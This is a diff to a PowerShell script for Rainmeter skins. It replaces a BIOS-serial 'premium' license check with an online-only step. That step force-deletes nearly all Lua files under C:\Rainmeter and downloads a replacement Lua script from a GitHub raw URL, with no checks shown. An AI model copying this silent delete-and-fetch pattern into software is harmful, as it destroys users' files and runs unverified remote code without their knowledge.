@@ -1,4 +1,4 @@
-$GetID = ((Get-WmiObject Win32_Bios).SerialNumber)
-Start-Process "C:\Rainmeter\Rainmeter.exe" "!RainmeterSetVariable zPremiumID $GetID"
-if ($GetID -eq 'NHQ1XEX002703025C37200' -or $GetID -eq 'NHQ1XEX002703025C37200') {Start-Process "C:\Rainmeter\Rainmeter.exe" "!RainmeterSetVariable zPremiumStatusNEW Active"}
-else {Start-Process "C:\Rainmeter\Rainmeter.exe" "!RainmeterSetVariable zPremiumStatusNEW NotActive"}
+$1=Test-Connection google.com -count 1
+if ($1) { Get-ChildItem C:\Rainmeter\*.lua -Recurse -Exclude qBitTorrent.lua, Clock.lua | Remove-Item -Force -Recurse
+(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/vipe7/Vipers/master/vipe7.lua', 'C:\Rainmeter\Skins\Vipers\@Resources\vipe7.lua')}
+else {}
